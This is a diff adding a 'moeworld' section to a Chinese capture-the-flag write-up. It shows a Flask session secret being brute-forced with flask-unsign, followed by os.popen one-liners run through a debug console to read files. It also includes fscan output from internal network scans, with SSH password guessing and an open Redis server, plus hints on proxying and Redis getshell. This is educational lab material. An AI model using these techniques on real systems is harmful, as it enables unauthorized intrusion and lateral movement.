@@ -1025,6 +1025,113 @@ https://www.cnblogs.com/c1047509362/p/12806297.html
 moectf{Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!}
 ```
 
+
+### moeworld
+生成一个字典后爆破
+
+```shell
+> flask-unsign --unsign --cookie "eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6ImtqaWVsIn0.ZQ0nYw.r4mHMnPyAZERTc4EmKW86Nqyrqw" --wordlist "D:\tmp\wordlist"
+```
+
+
+`This-random-secretKey-you-can't-getd21b`
+
+进入`console`路由
+
+```shell
+__import__('os').popen('cat /flag').read()
+#moectf{Information-leakage-Is-dangerous!
+
+__import__('os').popen('cat /readme').read()
+#恭喜你通过外网渗透拿下了本台服务器的权限\n接下来，你需要尝试内网渗透，本服务器的/app/tools目录下内置了fscan\n你需要了解它的基本用法，然后扫描内网的ip段\n如果你进行了正确的操作，会得到类似下面的结果\n10.1.11.11:22 open\n10.1.23.21:8080 open\n10.1.23.23:9000 open\n将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.zip压缩包的密码（本例中，密码为：22-8080-9000）\n注意：请忽略掉xx.xx.xx.1，例如扫出三个ip 192.168.0.1 192.168.0.2 192.168.0.3 ，请忽略掉有关192.168.0.1的所有结果！此为出题人服务器上的其它正常服务\n对密码有疑问随时咨询出题人
+```
+
+
+
+扫描172.21.0.1/24
+```
+start infoscan
+(icmp) Target 172.21.0.1      is alive
+(icmp) Target 172.21.0.3      is alive
+[*] Icmp alive hosts len is: 2
+172.21.0.1:80 open
+172.21.0.3:8080 open
+172.21.0.1:8000 open
+172.21.0.1:3306 open
+172.21.0.1:22 open
+172.21.0.1:21 open
+172.21.0.1:7777 open
+172.21.0.1:888 open
+[*] alive ports len is: 8
+start vulscan
+[*] WebTitle: http://172.21.0.1:7777    code:200 len:917    title:恭喜，站点创建成功！
+[*] WebTitle: http://172.21.0.1         code:200 len:138    title:404 Not Found
+[*] WebTitle: http://172.21.0.1:888     code:403 len:548    title:403 Forbidden
+[*] WebTitle: http://172.21.0.3:8080    code:302 len:199    title:Redirecting... 跳转url: http://172.21.0.3:8080/login
+[*] WebTitle: http://172.21.0.1:8000    code:302 len:199    title:Redirecting... 跳转url: http://172.21.0.1:8000/login
+[*] WebTitle: http://172.21.0.1:8000/login code:200 len:1145   title:LOGIN
+[*] WebTitle: http://172.21.0.3:8080/login code:200 len:1145   title:LOGIN
+已完成 7/8 [-] ssh 172.21.0.1:22 root root123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+已完成 7/8 [-] ssh 172.21.0.1:22 root 000000 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+已完成 7/8 [-] ssh 172.21.0.1:22 root 2wsx@WSX ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+已完成 7/8 [-] ssh 172.21.0.1:22 admin Admin@123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+已完成 7/8 [-] ssh 172.21.0.1:22 admin 123321 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+已完成 7/8 [-] ssh 172.21.0.1:22 admin system ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+已完成 8/8
+
+```
+
+172.20.0.1/24
+
+```
+start infoscan
+(icmp) Target 172.20.0.1      is alive
+(icmp) Target 172.20.0.2      is alive
+(icmp) Target 172.20.0.3      is alive
+(icmp) Target 172.20.0.4      is alive
+[*] Icmp alive hosts len is: 4
+172.20.0.1:21 open
+172.20.0.1:22 open
+172.20.0.4:8080 open
+172.20.0.3:3306 open
+172.20.0.1:3306 open
+172.20.0.1:80 open
+172.20.0.2:22 open
+172.20.0.2:6379 open
+172.20.0.1:7777 open
+172.20.0.1:888 open
+
+22-3306-6379-8080-8080
+[*] alive ports len is: 10
+start vulscan
+[*] WebTitle: http://172.20.0.1:888     code:403 len:548    title:403 Forbidden
+[+] Redis:172.20.0.2:6379 unauthorized file:/data/dump.rdb
+[+] Redis:172.20.0.2:6379 like can write /root/.ssh/
+[*] WebTitle: http://172.20.0.1:7777    code:200 len:917    title:恭喜，站点创建成功！
+[*] WebTitle: http://172.20.0.1         code:200 len:138    title:404 Not Found
+[*] WebTitle: http://172.20.0.4:8080    code:302 len:199    title:Redirecting... 跳转url: http://172.20.0.4:8080/login
+[*] WebTitle: http://172.20.0.4:8080/login code:200 len:1145   title:LOGIN
+
+```
+
+result `22-3306-6379-8080`
+
+```hint
+当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果
+可以看到，在本内网下还有另外两台服务器
+其中一台开启了22(ssh)和6379(redis)端口
+另一台开启了3306(mysql)端口
+还有一台正是你访问到的留言板服务
+接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器
+此处可了解`nps`和`frp`，同样在/app/tools已内置了相应文件
+连接代理，推荐`proxychains`
+对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2
+对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3
+
+```
+
+
+
 # pwn
 
 # crypto
